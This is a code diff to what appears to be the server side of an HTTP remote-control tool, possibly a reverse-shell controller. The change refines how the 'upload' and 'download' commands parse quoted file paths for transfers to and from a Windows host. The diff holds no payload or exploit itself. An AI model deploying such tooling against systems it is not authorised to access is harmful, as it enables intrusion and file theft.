@@ -118,11 +118,18 @@ class myHandler(BaseHTTPRequestHandler):
 
     def sendCommand(self, command, html, content=""):
         if (command != ""):
-            if (command.split(" ")[0] == "upload"):
+            command_list = command.split(" ")
+            if (command_list[0] == "upload"):
                 functions = Functions()
                 try:
-                    upload = command.split(" ")[0]
-                    filename = command.split(" ")[1]
+                    if (len(command_list) == 3 or command[-1] == '"'):
+                        if '"' in command_list[1]:
+                            filename = command.split('"')[1]
+                        else:
+                            filename = command_list[1]
+                    elif ('"' in command_list[1]):
+                        filename = command.split('"')[1]
+                        
                     content = functions.upload(filename)
                     html = content.decode('utf-8')
                 except AttributeError:
@@ -131,11 +138,14 @@ class myHandler(BaseHTTPRequestHandler):
                 except IndexError:
                     print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                     print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
-            elif (command.split(" ")[0] == "download"):
+                except UnboundLocalError:
+                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
+                    print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
+            elif (command_list[0] == "download"):
                 try:
-                    download = command.split(" ")[0]
-                    srcFile = command.split(" ")[1]
-                    dstFile = command.split(" ")[2]
+                    download = command_list[0]
+                    srcFile = command_list[1]
+                    dstFile = command_list[2]
                 except IndexError:
                     print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                     print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
